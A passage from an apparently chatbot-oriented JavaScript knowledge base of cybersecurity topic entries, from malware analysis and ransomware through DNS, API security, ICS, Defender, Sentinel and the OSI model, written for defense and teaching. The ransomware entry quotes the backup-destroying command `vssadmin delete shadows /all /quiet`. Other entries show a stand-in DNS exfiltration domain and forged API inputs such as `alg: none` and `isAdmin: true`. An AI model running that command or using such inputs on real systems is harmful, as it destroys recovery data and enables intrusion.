    overview: 'Malware Analysis and Reverse Engineering is the disciplined process of dissecting malicious software (viruses, trojans, ransomware, rootkits, infostealers) to understand how it functions, determine its origin and objectives, evaluate the extent of an infection, and extract actionable Indicators of Compromise (IOCs) for defensive prevention.',
    pillars: [
      '**Static Analysis (Without Execution):** Inspecting binary structure without running the file. Includes computing cryptographic hashes (SHA-256), extracting readable strings (strings), analyzing Portable Executable (PE) or ELF headers, inspecting imported and exported DLL APIs (e.g. VirtualAlloc, WriteProcessMemory signaling process injection), and decompiling with NSA Ghidra or IDA Pro.',
      '**Dynamic Analysis (Live Execution):** Executing the sample inside an instrumented, isolated sandbox (e.g. ANY.RUN, Cuckoo Sandbox, Flare-VM). Monitoring process activity (Process Hacker/Procmon), file creation, registry modifications, and network beaconing (Wireshark).',
      '**Evasion & Anti-Analysis Techniques:** Advanced malware checks for virtual machine artifacts (e.g. hypervisor registry keys, sleep acceleration, mouse movement), uses packing and obfuscation to defeat static analysis, and encrypts strings to hide C2 domains.',
      '**YARA Rule Authoring:** Creating pattern-matching rules based on unique byte sequences, strings, and header characteristics to identify and classify malware families across files and memory dumps.'
    ],
    operationalUse: [
      '**Threat Intelligence & SOC:** Rapidly triaging suspicious email attachments, identifying C2 command servers to add to enterprise firewalls, and publishing IOC packages (STIX/TAXII) to the security community.'
    ],
    defenseAndHardening: [
      '**Safe Sandboxing:** Always perform analysis within strictly air-gapped virtual environments with host-only networking to prevent accidental network propagation.'
    ],
    followUpQuestion: 'Would you like to see how to decompile an executable with Ghidra, or write a custom YARA rule to detect a malware family?',
    authorityResource: {
      id: 'auth-malware-analysis',
      title: 'NSA Ghidra Software Reverse Engineering Framework & Documentation',
      canonicalUrl: 'https://ghidra-sre.org/',
      provider: { name: 'NSA' },
      resourceType: 'tool',
      difficultyLevel: 'intermediate',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'The premier free, open-source software reverse engineering suite with decompilers for x86, ARM, and MIPS architectures.'
    }
  },

  // 18. Phishing & Email Security
  {
    id: 'phishing_email_sec',
    title: 'Phishing & Email Security Protocols (SPF / DKIM / DMARC)',
    keywords: ['phishing', 'email security', 'spf', 'dkim', 'dmarc', 'spear phishing', 'social engineering', 'credential harvesting'],
    regex: /\b(phishing|email security|spf|dkim|dmarc|spear phishing|social engineering)\b/i,
    role: 'Social Engineering Defense, Mail Authentication & Domain Spoofing Prevention',
    overview: 'Phishing is the deceptive practice of manipulating individuals into divulging sensitive information (credentials, financial data) or executing malicious code, predominantly via email. Technical email security relies on a cryptographic triad of protocols—SPF, DKIM, and DMARC—to authenticate senders and prevent unauthorized domain impersonation.',
    pillars: [
      '**SPF (Sender Policy Framework):** A DNS TXT record published by a domain owner that specifies which mail servers (IP addresses) are authorized to send email on behalf of that domain. Receiving mail servers verify the sender IP during the SMTP envelope exchange.',
      '**DKIM (DomainKeys Identified Mail):** Uses asymmetric cryptography to sign outgoing emails. The sending server signs specified email headers and body with its private key; the receiving server fetches the public key from the sender\'s DNS records and validates that the message was not modified in transit.',
      '**DMARC (Domain-based Message Authentication, Reporting, and Conformance):** Connects SPF and DKIM with domain alignment. Allows domain owners to publish a policy instructing receiving mail servers how to treat emails failing SPF/DKIM (`p=none`, `p=quarantine`, or `p=reject`), and provides aggregate reporting on spoofing attempts.',
      '**Adversary-in-the-Middle (AiTM) Phishing:** Modern phishing kits (e.g. Evilginx) proxy legitimate login pages in real time to capture username, password, and session cookies, bypassing traditional SMS and app-based push MFA.'
    ],
    operationalUse: [
      '**SOC Analysts:** Investigating reported phishing emails via email header analysis (Received headers, Message-ID, DKIM-Signature), sandbox URL detonation, and removing malicious emails from mailboxes enterprise-wide.'
    ],
    defenseAndHardening: [
      '**Enforce DMARC p=reject:** Transition DMARC policy from monitoring (`p=none`) to strict blocking (`p=reject`), completely shutting down direct domain spoofing.',
      '**Deploy FIDO2 Hardware Security Keys:** Implement hardware WebAuthn/FIDO2 MFA (YubiKeys), which cryptographically bind authentication to the legitimate domain URL, completely stopping AiTM phishing proxies.'
    ],
    followUpQuestion: 'Would you like to inspect a raw email header to analyze SPF/DKIM/DMARC alignment, or explore how AiTM phishing proxies work?',
    authorityResource: {
      id: 'auth-phishing',
      title: 'CISA Phishing Guidance & Email Security Technical Implementations',
      canonicalUrl: 'https://www.cisa.gov/resources-tools/resources/phishing-guidance',
      provider: { name: 'CISA' },
      resourceType: 'official_doc',
      difficultyLevel: 'beginner',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'Authoritative federal guidance on protecting organizations against social engineering and implementing DMARC.'
    }
  },

  // 19. Ransomware
  {
    id: 'ransomware',
    title: 'Ransomware Operations, Kill Chain & Enterprise Defense',
    keywords: ['ransomware', 'extortion', 'crypto malware', 'vssadmin', 'shadow copies', 'double extortion', 'lockbit', 'blackcat'],
    regex: /\b(ransomware|extortion|double extortion|vssadmin|crypto malware)\b/i,
    role: 'Cyber Extortion Threat Mitigation, Business Continuity & Resilience',
    overview: 'Ransomware is malicious software designed to deny access to computer systems or data by encrypting files, accompanied by extortion demands for ransom payments. Modern enterprise ransomware operations operate under a Ransomware-as-a-Service (RaaS) model and practice double extortion (encrypting systems and threatening to leak exfiltrated proprietary data).',
    pillars: [
      '**Ransomware Kill Chain:** 1. Initial Access (phishing, exposed RDP, edge appliance vulnerabilities like VPNs) -> 2. Credential Theft & Privilege Escalation (LSASS dumping via Mimikatz) -> 3. Internal Reconnaissance & Lateral Movement (PsExec, WMI, SMB) -> 4. Data Exfiltration (Mega, Rclone) -> 5. Defense Evasion (terminating EDR services, disabling Defender) -> 6. Inhibiting System Recovery (deleting Volume Shadow Copies via `vssadmin delete shadows /all /quiet`) -> 7. Mass Multithreaded Encryption using AES-256 or ChaCha20.',
      '**Double Extortion Mechanics:** Extortion groups exfiltrate gigabytes of confidential trade secrets, customer records, and financial documents to private leak sites prior to encryption, ensuring leverage even if the victim has working backups.'
    ],
    operationalUse: [
      '**Incident Responders:** Immediately severing enterprise network connections and cloud sync connectors to halt encryption propagation, recovering systems from offline backups, and tracing initial access.'
    ],
    defenseAndHardening: [
      '**Immutable, Air-Gapped Backups:** Maintain the 3-2-1 backup strategy (3 copies, 2 different media, 1 offsite/immutable) with write-once-read-many (WORM) storage that cannot be deleted or modified even by compromised domain admins.',
      '**Attack Surface Reduction (ASR) & Privilege Tiering:** Deploy ASR rules to block credential stealing from `lsass.exe`, prevent Office applications from creating child processes, and enforce tiered administrative models.'
    ],
    followUpQuestion: 'Would you like to see how Volume Shadow Copies are protected in Windows enterprise baselines, or examine ransomware detection rules?',
    authorityResource: {
      id: 'auth-ransomware',
      title: 'CISA & FBI StopRansomware Official Guide',
      canonicalUrl: 'https://www.cisa.gov/stopransomware/ransomware-guide',
      provider: { name: 'CISA / FBI' },
      resourceType: 'official_doc',
      difficultyLevel: 'intermediate',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'The definitive joint federal guide containing technical checklists for ransomware prevention and incident response.'
    }
  },

  // 20. VPN & Tunneling
  {
    id: 'vpn_tunneling',
    title: 'Virtual Private Networks (VPN) & Secure Tunneling Protocols',
    keywords: ['vpn', 'ipsec', 'wireguard', 'openvpn', 'virtual private network', 'tunneling', 'split tunneling', 'ikev2'],
    regex: /\b(vpn|virtual private networks?|ipsec|wireguard|openvpn|ikev2|split tunneling)\b/i,
    role: 'Secure Remote Access, Site-to-Site Encrypted Tunnels & Network Privacy',
    overview: 'A Virtual Private Network (VPN) encrypts internet traffic and extends a private network across a public or untrusted network, establishing an authenticated and encrypted tunnel between remote users or branch offices and the corporate intranet.',
    pillars: [
      '**IPsec (Internet Protocol Security):** Operates at the Network Layer (Layer 3). Utilizes Internet Key Exchange (IKEv2) for mutual authentication and session negotiation, and Encapsulating Security Payload (ESP) to encrypt IP packets. Widely used for high-performance site-to-site tunnels.',
      '**OpenVPN:** Operates at the Transport Layer in user-space using OpenSSL/TLS. Can run over UDP (fast) or TCP port 443 (effectively blending with HTTPS traffic to bypass restrictive network firewalls).',
      '**WireGuard:** Modern, extremely fast Layer 3 VPN running in Linux kernel space. Replaces complex cryptographic negotiation with state-of-the-art primitives (Noise protocol, Curve25519, ChaCha20-Poly1305, BLAKE2s) in fewer than 4,000 lines of code, making security auditing dramatically simpler.',
      '**Split Tunneling vs Full Tunneling:** Full tunneling routes all traffic through the VPN gateway; Split tunneling routes only internal corporate traffic through the VPN while general internet traffic exits locally, reducing bandwidth consumption but creating endpoint security exposure.'
    ],
    operationalUse: [
      '**Network Engineers:** Configuring secure remote-access gateways and establishing encrypted site-to-site connections between cloud VPCs and on-premises data centers.'
    ],
    defenseAndHardening: [
      '**Mandate Multi-Factor Authentication:** Always require MFA on all VPN logins to prevent compromised credentials from providing direct network access.',
      '**Transition toward ZTNA:** Replace broad subnet-level VPN access with Zero Trust Network Access (ZTNA) so that authenticated users can only connect to authorized individual applications rather than entire subnets.'
    ],
    followUpQuestion: 'Would you like to see how WireGuard\'s cryptographic handshake compares to IPsec IKEv2, or explore split tunneling risks?',
    authorityResource: {
      id: 'auth-vpn',
      title: 'NIST SP 800-77 Rev. 1: Guide to IPsec VPNs',
      canonicalUrl: 'https://csrc.nist.gov/publications/detail/sp/800-77/rev-1/final',
      provider: { name: 'NIST' },
      resourceType: 'official_doc',
      difficultyLevel: 'intermediate',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'Official NIST guidelines on planning, implementing, and maintaining IPsec and secure tunneling architectures.'
    }
  },

  // 21. DNS Security & Sinkholing
  {
    id: 'dns_security',
    title: 'DNS Architecture, DNSSEC & DNS Sinkholing',
    keywords: ['dns security', 'dnssec', 'dns sinkhole', 'dns tunneling', 'dga', 'doh', 'dot', 'domain name system'],
    regex: /\b(dns security|dnssec|dns sinkhole|dns tunneling|domain name system security)\b/i,
    role: 'Internet Resolution Integrity, C2 Detection & Network-Level Threat Blocking',
    overview: 'The Domain Name System (DNS) is the distributed hierarchical naming system that translates human-readable domain names into IP addresses. Because almost all network connections begin with a DNS lookup, DNS is both a primary target for adversary evasion and a high-leverage defensive control point.',
    pillars: [
      '**DNS Security Extensions (DNSSEC):** Adds cryptographic authentication to DNS responses using digital signatures (RRSIG records) verified against public keys (DNSKEY) forming a Chain of Trust anchored at the root zone. Protects against DNS cache poisoning and spoofing.',
      '**DNS Tunneling:** An evasion technique where attackers encode exfiltrated data or command-and-control communication inside DNS queries (e.g. `data-payload.c2.attacker.com`). Because organizations often permit outbound UDP port 53 without inspection, tunneling bypasses basic firewalls.',
      '**Domain Generation Algorithms (DGA):** Malware algorithms that dynamically generate hundreds of pseudo-random domain names daily for C2 rendezvous, defeating static domain blocklists.',
      '**DNS Sinkholing:** A defensive technique where internal recursive DNS resolvers are configured to intercept queries for known malicious domains and return an internal loopback or sinkhole IP address (e.g., 127.0.0.1 or a monitoring server), neutralizing malware communication and instantly pinpointing infected internal hosts.'
    ],
    operationalUse: [
      '**SOC Analysts:** Monitoring DNS query logs for anomalous spikes in entropy, unusually long subdomain lengths (indicating DNS tunneling), and high volumes of NXDOMAIN responses (indicating DGA activity).'
    ],
    defenseAndHardening: [
      '**Deploy Protective DNS (PDNS):** Route all corporate DNS resolution through an inspecting DNS security gateway (e.g. Quad9, Cloudflare 1.1.1.2) that automatically blocks malicious domains and enforces DNSSEC.'
    ],
    followUpQuestion: 'Would you like to see how DNS sinkholing redirects malware traffic in real time, or analyze how DNS tunneling encodes data?',
    authorityResource: {
      id: 'auth-dns-security',
      title: 'CISA & NSA Protective DNS (PDNS) Guidance',
      canonicalUrl: 'https://www.cisa.gov/resources-tools/resources/protective-dns',
      provider: { name: 'CISA / NSA' },
      resourceType: 'official_doc',
      difficultyLevel: 'beginner',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'Joint federal advisory on implementing Protective DNS to stop malware command-and-control and phishing.'
    }
  },

  // 22. API Security
  {
    id: 'api_security',
    title: 'API Security & OWASP API Security Top 10',
    keywords: ['api security', 'owasp api', 'bola', 'broken object level authorization', 'rest api security', 'graphql security', 'api gateway'],
    regex: /\b(api security|owasp api|bola|broken object level authorization|api gateway)\b/i,
    role: 'Microservices Protection, Data Serialization Security & API Gateway Governance',
    overview: 'APIs (Application Programming Interfaces) power modern web, mobile, and cloud-native microservice architectures. Because APIs directly expose application business logic and sensitive database objects over HTTP/JSON, they have become the primary attack surface targeted by threat actors.',
    pillars: [
      '**BOLA (Broken Object Level Authorization - API1):** The most widespread and critical API vulnerability. Occurs when an API endpoint accepts an object identifier (e.g. `/api/v1/accounts/1024/statement`) without verifying whether the authenticated user has permission to access that specific object ID, allowing mass unauthorized data exposure.',
      '**Broken Authentication (API2):** Flaws in authentication mechanisms—such as missing rate limits on login/password reset endpoints, weak JSON Web Token (JWT) signature verification (e.g. accepting `"alg": "none"`), or lack of token revocation upon logout.',
      '**Mass Assignment & Broken Property Authorization:** APIs automatically binding incoming client JSON properties directly to internal database models, allowing attackers to modify sensitive properties like `{"isAdmin": true}` or `{"accountBalance": 999999}`.',
      '**API Gateways:** Centralized gateways (e.g. Kong, Apigee, AWS API Gateway) providing reverse proxying, rate limiting, OAuth 2.0 / JWT validation, Mutual TLS (mTLS), and schema validation.'
    ],
    operationalUse: [
      '**AppSec Engineers:** Implementing automated OpenAPI/Swagger specification testing, fuzzing API endpoints for parameter tampering, and auditing code for object-level permission checks.'
    ],
    defenseAndHardening: [
      '**Implement Object-Level Checks:** Always validate user authorization at the database layer (e.g. `SELECT * FROM accounts WHERE id = ? AND owner_id = current_user_id`).',
      '**Strict Schema Validation:** Enforce strict request body schemas that reject any unexpected JSON properties, preventing mass assignment.'
    ],
    followUpQuestion: 'Would you like to explore an example of a Broken Object Level Authorization (BOLA) vulnerability, or see how API gateways validate JWTs?',
    authorityResource: {
      id: 'auth-api-sec',
      title: 'OWASP API Security Project & Top 10 Documentation',
      canonicalUrl: 'https://owasp.org/www-project-api-security/',
      provider: { name: 'OWASP' },
      resourceType: 'official_doc',
      difficultyLevel: 'intermediate',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'The industry standard ranking the top ten most critical API vulnerabilities and their defensive remediation patterns.'
    }
  },

  // 23. Buffer Overflows
  {
    id: 'buffer_overflow',
    title: 'Buffer Overflows & Binary Memory Corruption',
    keywords: ['buffer overflow', 'stack overflow', 'memory corruption', 'aslr', 'dep', 'nx', 'rop', 'stack canary', 'shellcode'],
    regex: /\b(buffer overflows?|stack buffer overflow|memory corruption|aslr|stack canar(y|ies)|return oriented programming|rop)\b/i,
    role: 'Low-Level Systems Security, Memory Safety & Binary Exploit Mitigation',
    overview: 'A Buffer Overflow occurs when a program writes more data into a memory buffer than the allocated space can hold, corrupting adjacent memory locations on the stack or heap. In low-level unmanaged languages (C and C++), this vulnerability can allow an attacker to hijack the CPU\'s instruction pointer and execute arbitrary code.',
    pillars: [
      '**Stack Architecture & Control Flow:** When a function is called, a stack frame is allocated containing: function arguments, the Saved Return Address (EIP / RIP) (pointing to the next instruction in the caller), the Saved Frame Pointer (EBP / RBP), and local variable buffers. In vulnerable code using unsafe functions like `strcpy()`, `gets()`, or `sprintf()`, an unbounded write overflows the local buffer, overwriting the saved return address.',
      '**Exploitation Mechanics:** By overwriting the return address with the memory address of attacker-supplied shellcode (or Return-Oriented Programming / ROP gadgets), execution redirects to the attacker\'s payload when the function executes the `RET` instruction.',
      '**Operating System Exploit Mitigations:**\n  • **DEP / NX (Data Execution Prevention / No-Execute):** Marks stack and heap memory pages as non-executable, preventing direct shellcode execution.\n  • **ASLR (Address Space Layout Randomization):** Randomizes memory addresses of the stack, heap, and shared libraries on every execution, making hardcoded exploit addresses fail.\n  • **Stack Canaries / Guard Pages:** Inserts a secret pseudo-random value between local variables and the return address (`__stack_chk_fail`); if the canary is modified when the function returns, the program terminates immediately.'
    ],
    operationalUse: [
      '**Vulnerability Researchers & Binary Auditors:** Using debuggers (GDB, x64dbg) and fuzzers (AFL++, LibFuzzer) to find memory corruption flaws and develop security patches.'
    ],
    defenseAndHardening: [
      '**Adopt Memory-Safe Languages:** Migrate critical software components to memory-safe languages (Rust, Go, modern C++ with bounds checking).',
      '**Compiler Hardening Flags:** Compile C/C++ binaries with `-fstack-protector-all`, `-Wl,-z,relro,-z,now` (Full RELRO), and `-D_FORTIFY_SOURCE=2`.'
    ],
    followUpQuestion: 'Would you like to see how stack canaries and ASLR prevent return address overwrites, or inspect a vulnerable C program in GDB?',
    authorityResource: {
      id: 'auth-buffer-overflow',
      title: 'SEI CERT C Coding Standard & Memory Safety Guidelines',
      canonicalUrl: 'https://wiki.sei.cmu.edu/confluence/display/c',
      provider: { name: 'Carnegie Mellon SEI' },
      resourceType: 'official_doc',
      difficultyLevel: 'advanced',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'The definitive industry coding standard for preventing memory corruption vulnerabilities in C/C++ applications.'
    }
  },

  // 24. ICS / SCADA
  {
    id: 'ics_scada',
    title: 'Industrial Control Systems (ICS/SCADA) & Purdue Model',
    keywords: ['ics', 'scada', 'purdue model', 'ot security', 'modbus', 'dnp3', 'plc', 'operational technology'],
    regex: /\b(ics|scada|purdue model|ot security|operational technology|modbus|dnp3|programmable logic controller|plc)\b/i,
    role: 'Critical Infrastructure Protection, Industrial Automation & Safety Systems',
    overview: 'Industrial Control Systems (ICS) and Operational Technology (OT) encompass the hardware and software used to monitor and control physical industrial processes across critical infrastructure (power generation, water treatment, oil and gas, and manufacturing).',
    pillars: [
      '**Purdue Enterprise Reference Architecture (Purdue Model):** Segregates industrial and enterprise networks into distinct security levels:\n  • **Level 0 (Physical Process):** Sensors, actuators, pumps, and motors.\n  • **Level 1 (Basic Control):** Programmable Logic Controllers (PLCs), Remote Terminal Units (RTUs), and Distributed Control Systems (DCS).\n  • **Level 2 (Area Supervisory Control):** Human-Machine Interfaces (HMIs) and operator workstations.\n  • **Level 3 (Site Operations & Control):** Industrial Historians, engineering workstations, and batch management.\n  • **Industrial DMZ (IDMZ - Level 3.5):** Strict security perimeter separating corporate enterprise IT from industrial OT.\n  • **Levels 4 & 5 (Enterprise IT):** Corporate business networks, email, ERP, and internet connectivity.',
      '**Industrial Communication Protocols:** Protocols like Modbus TCP, DNP3, and EtherNet/IP were historically designed without authentication, integrity checks, or encryption, making network segmentation the primary defensive barrier.',
      '**Safety Instrumented Systems (SIS):** Dedicated, independent physical safety systems (e.g. emergency shutoff valves) designed to keep physical processes in a safe state regardless of cyber attacks.'
    ],
    operationalUse: [
      '**OT Security Specialists:** Deploying passive network monitoring appliances (e.g. Nozomi Networks, Claroty, Dragos) that inspect industrial traffic without injecting packets that could crash fragile PLCs.'
    ],
    defenseAndHardening: [
      '**Strict IDMZ Boundary & Unidirectional Data Diodes:** Ensure zero direct communication between Level 4 enterprise IT and Level 1/2 control systems; use hardware data diodes for exporting historian telemetry safely.'
    ],
    followUpQuestion: 'Would you like to explore how the Purdue Model isolates Level 1 PLCs from corporate IT, or examine Modbus packet inspection?',
    authorityResource: {
      id: 'auth-ics-scada',
      title: 'CISA ICS-CERT Recommended Practices & Security Architecture Guidelines',
      canonicalUrl: 'https://www.cisa.gov/topics/industrial-control-systems',
      provider: { name: 'CISA' },
      resourceType: 'official_doc',
      difficultyLevel: 'intermediate',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'Comprehensive federal technical guidance on securing industrial control systems, SCADA, and critical infrastructure.'
    }
  },

  // 25. Automotive Security (Strictly automotive only!)
  {
    id: 'automotive_security',
    title: 'Automotive Cybersecurity & Controller Area Network (CAN Bus)',
    keywords: ['can bus', 'car hacking', 'automotive security', 'obd-ii', 'vehicle security', 'electronic control unit', 'opengarages'],
    regex: /\b(can bus|car hacking|automotive security|vehicle security|obd-ii|electronic control units?|vehicle ecu)\b/i,
    role: 'Connected Vehicle Protection, In-Vehicle Network Security & Functional Safety',
    overview: 'Automotive cybersecurity focuses on protecting connected vehicles, electronic control units (ECUs), and in-vehicle communication networks against unauthorized access, manipulation, and safety disruption.',
    pillars: [
      '**Controller Area Network (CAN Bus):** A broadcast, message-based protocol used to communicate between vehicle ECUs (brakes, steering, engine, infotainment). Standard CAN frames contain an Arbitration ID (priority indicator), Control Field, and up to 8 bytes of data payload. Standard CAN has no native authentication, sender identification, or encryption.',
      '**OBD-II (On-Board Diagnostics) Port:** Physical diagnostic port located under the dashboard providing direct physical access to the vehicle\'s CAN buses.',
      '**Vehicle Attack Surfaces:** Telematics control units (cellular/LTE), Bluetooth infotainment systems, keyless entry (relay attacks), and over-the-air (OTA) firmware update pipelines.'
    ],
    operationalUse: [
      '**Automotive Security Engineers:** Analyzing CAN bus traffic using SocketCAN on Linux (`cansniffer`, `candump`, `canplayer`), reverse-engineering diagnostic commands, and implementing AUTOSAR SecOC (Secure Onboard Communication).'
    ],
    defenseAndHardening: [
      '**Automotive Gateway ECUs:** Isolate safety-critical CAN buses (brakes, powertrain) from non-critical infotainment and telematics buses with hardware gateways.'
    ],
    followUpQuestion: 'Would you like to explore how SocketCAN tools inspect CAN frames on Linux, or see how gateway ECUs isolate critical vehicle networks?',
    authorityResource: {
      id: 'auth-automotive',
      title: 'OpenGarages: Car Hacker\'s Handbook Companion & Vehicle Security Guides',
      canonicalUrl: 'https://opengarages.org/',
      provider: { name: 'OpenGarages' },
      resourceType: 'tool',
      difficultyLevel: 'advanced',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'The premier community curriculum for understanding automotive networks, CAN bus reverse engineering, and vehicle safety testing.'
    }
  },

  // 26. Microsoft Defender
  {
    id: 'defender',
    title: 'Microsoft Defender for Endpoint (MDE) & XDR',
    keywords: ['microsoft defender', 'defender', 'mde', 'windows defender', 'ms defender', 'defender for endpoint'],
    regex: /\b(defender|mde|microsoft defender|windows defender|ms defender)\b/i,
    role: 'Endpoint Detection and Response (EDR), Next-Gen Antivirus (NGAV) & XDR',
    overview: 'Microsoft Defender for Endpoint (MDE) is an enterprise-grade endpoint security and Extended Detection and Response (EDR / XDR) platform. In enterprise cybersecurity, endpoints (laptops, servers, workstations) are the primary entry point for cyber attacks via phishing, weaponized attachments, credential harvesting, and drive-by downloads.',
    pillars: [
      '**Endpoint Detection & Response (EDR):** The Defender sensor runs directly inside the Windows, Linux, and macOS OS kernels. It continuously monitors and records process creation trees, network sockets, file modifications, and registry changes, streaming telemetry to the cloud for real-time behavioral correlation.',
      '**Next-Generation Antivirus (NGAV):** Cloud-delivered, machine learning-driven protection that detects and quarantines malicious binaries, polymorphic malware, and fileless in-memory attacks before they execute.',
      '**Attack Surface Reduction (ASR) Rules:** Hardening controls that stop attacks at the earliest phase—such as blocking Office applications from spawning PowerShell/CMD child processes, blocking credential theft from the Windows Local Security Authority Subsystem Service (`lsass.exe`), and preventing untrusted executable files from running off USB drives.',
      '**Automated Investigation & Remediation (AIR):** AI-driven playbooks that automatically analyze triggered alerts, inspect affected machines, identify the root cause artifact, terminate running malicious processes, and quarantine files across the fleet.'
    ],
    operationalUse: [
      '**SOC Analysts (Incident Triage):** When an alert triggers, analysts inspect the visual Execution Tree (Process Timeline) showing which parent process spawned the command, what network IP the host contacted, and what files were touched.',
      '**Incident Responders:** Analysts can Isolate the Device from the enterprise network with one click (severing all lateral movement pathways while maintaining a cloud management tunnel), or launch Live Response to drop into a remote forensic command line on the host to dump memory, collect triage artifacts, or inspect persistence.',
      '**Threat Hunters (Advanced Hunting):** Analysts author Kusto Query Language (KQL) queries against months of raw endpoint telemetry across tens of thousands of endpoints to proactively hunt for stealthy Living-off-the-Land Binaries (LOLBins) and advanced adversary persistence.'
    ],
    defenseAndHardening: [
      '**Enable All Attack Surface Reduction (ASR) Rules:** Enforce rules in block mode to stop Office child processes and LSASS credential dumping.',
      '**Enforce Tamper Protection:** Prevent local administrators or malware from turning off Defender antivirus or real-time protection.'
    ],
    followUpQuestion: 'Would you like to see an example of a KQL threat hunting query used in Defender, or learn how to test Attack Surface Reduction (ASR) rules in a safe lab?',
    authorityResource: {
      id: 'auth-defender',
      title: 'Microsoft Learn: Microsoft Defender for Endpoint Architecture & Lab',
      canonicalUrl: 'https://learn.microsoft.com/en-us/defender-endpoint/microsoft-defender-endpoint',
      provider: { name: 'Microsoft' },
      resourceType: 'official_doc',
      difficultyLevel: 'beginner',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'Official architectural documentation detailing Microsoft Defender for Endpoint deployment, sensor telemetry, and threat response.'
    }
  },

  // 27. Microsoft Sentinel
  {
    id: 'sentinel',
    title: 'Microsoft Sentinel (Cloud SIEM & SOAR)',
    keywords: ['sentinel', 'microsoft sentinel', 'azure sentinel', 'ms sentinel', 'kql'],
    regex: /\b(sentinel|microsoft sentinel|azure sentinel|ms sentinel)\b/i,
    role: 'Cloud SIEM, Security Orchestration & Automated Response (SOAR)',
    overview: 'Microsoft Sentinel is a scalable, cloud-native SIEM (Security Information and Event Management) and SOAR (Security Orchestration, Automation, and Response) solution. While tools like Microsoft Defender focus on monitoring individual endpoints, Sentinel acts as the central nervous system of the Security Operations Center (SOC), aggregating, correlating, and alerting across the entire enterprise infrastructure.',
    pillars: [
      '**Collect (Data Connectors):** Ingests security logs at cloud scale from every corner of your environment—including Microsoft Defender, Microsoft 365, AWS CloudTrail, Google Cloud Platform, Okta, perimeter firewalls (Palo Alto, Fortinet, Cisco), and on-premises Windows domain controllers.',
      '**Detect (Analytics Rules & KQL):** Uses Kusto Query Language (KQL) and behavioral machine learning to evaluate billions of incoming log events every hour, alerting when behavior matches known adversary tactics mapped to the MITRE ATT&CK matrix.',
      '**Investigate (Incident Workbenches & Graph):** Groups related alerts into unified Incidents to eliminate alert fatigue. The visual Investigation Graph maps the relationships between compromised user accounts, attacker IP addresses, targeted hosts, and suspicious file hashes.',
      '**Respond (Automated SOAR Playbooks):** Powered by Azure Logic Apps, Sentinel executes automated playbooks within seconds—such as automatically blocking an attacker\'s IP on perimeter firewalls, disabling a compromised Active Directory account, or paging the on-call incident response team in Slack/Teams.'
    ],
    operationalUse: [
      '**SOC Analysts:** Triage high-priority enterprise incidents, trace lateral movement across hybrid cloud networks, and document incident response timelines.',
      '**Detection Engineers:** Author custom detection analytics rules in KQL to hunt for zero-day exploitation patterns and configure automated remediation playbooks.'
    ],
    defenseAndHardening: [
      '**Integrate Complete Data Connectors:** Ensure identity (Entra ID), cloud activity, and endpoint logs are connected with continuous data health monitoring.',
      '**Tune Analytics Rules:** Routinely review and suppress noisy alerts to protect analyst bandwidth.'
    ],
    followUpQuestion: 'Would you like to explore how KQL queries work in Sentinel to detect suspicious logins, or see how automated SOAR playbooks respond to incidents?',
    authorityResource: {
      id: 'auth-sentinel',
      title: 'Microsoft Learn: Microsoft Sentinel Cloud SIEM & SOAR Architecture',
      canonicalUrl: 'https://learn.microsoft.com/en-us/azure/sentinel/overview',
      provider: { name: 'Microsoft' },
      resourceType: 'official_doc',
      difficultyLevel: 'beginner',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'Comprehensive official guide to Microsoft Sentinel cloud SIEM and SOAR architecture, KQL detection rules, and automated playbooks.'
    }
  },

  // 28. OSI Model
  {
    id: 'osi_model',
    title: 'The OSI (Open Systems Interconnection) 7-Layer Reference Model',
    keywords: ['osi', 'osi model', '7 layers', 'open systems interconnection'],
    regex: /\b(osi|osi model|7 layers|open systems interconnection)\b/i,
    role: 'Network Reference Architecture, Layered Security Mapping & Packet Encapsulation',
    overview: 'The OSI (Open Systems Interconnection) Model is the essential 7-layer architectural framework created by the ISO to standardize how computer systems communicate across a network. For cybersecurity professionals, the OSI model is our primary mental map for threat modeling, packet analysis, and defense in depth.',
    pillars: [
      '**Layer 7 — Application (HTTP/HTTPS, DNS, SSH, SMTP, FTP):** User-facing protocols and web APIs process data. *Security Lens:* Web attacks like SQL Injection, Cross-Site Scripting (XSS), CSRF, and broken authorization. *Defenses:* Web Application Firewalls (WAF), secure input validation, API security gateways.',
      '**Layer 6 — Presentation (TLS/SSL, SSH encryption, MIME, JSON):** Data formatting, serialization, compression, and encryption/decryption. *Security Lens:* SSL stripping, cipher downgrades, certificate spoofing. *Defenses:* Strict TLS 1.3 enforcement, HSTS, secure PKI certificate management.',
      '**Layer 5 — Session (NetBIOS, RPC, SOCKS):** Establishing, maintaining, and synchronizing connections between applications. *Security Lens:* Session hijacking, token replay attacks, authentication cookie theft. *Defenses:* High-entropy session IDs, short expiration timeouts, mutual TLS.',
      '**Layer 4 — Transport (TCP, UDP):** End-to-end packet delivery, multiplexing via port numbers (e.g. 443, 80, 22), and flow control. *Security Lens:* SYN flood DDoS, stealth port scanning (Nmap SYN scan), connection resets. *Defenses:* Stateful inspection firewalls, SYN cookies, connection rate limiting.',
      '**Layer 3 — Network (IP, ICMP, IPsec, BGP):** Logical packet routing across interconnected networks via IP addresses. *Security Lens:* IP address spoofing, ICMP ping floods, BGP routing hijacks. *Defenses:* Network firewalls, router Access Control Lists (ACLs), BGP RPKI filtering.',
      '**Layer 2 — Data Link (Ethernet, Wi-Fi 802.11, Switches, MAC addresses):** Hop-to-hop frame transfer within the local network segment using physical MAC addresses. *Security Lens:* ARP poisoning/spoofing, MAC flooding, rogue DHCP servers, VLAN hopping. *Defenses:* Dynamic ARP Inspection (DAI), DHCP snooping, 802.1X port security.',
      '**Layer 1 — Physical (Cables, fiber optics, radio frequencies, network taps):** Raw bitstream transmission across electrical, optical, or RF physical media. *Security Lens:* Physical wiretapping, rogue hardware implants (e.g. USB Rubber Ducky), Wi-Fi radio jamming. *Defenses:* Physical data center security, port locks, shielded cabling.'
    ],
    operationalUse: [
      '**Mnemonics for Memory:**\n• **Top-down (L7 to L1):** *"All People Seem To Need Data Processing"*\n• **Bottom-up (L1 to L7):** *"Please Do Not Throw Sausage Pizza Away"*'
    ],
    defenseAndHardening: [
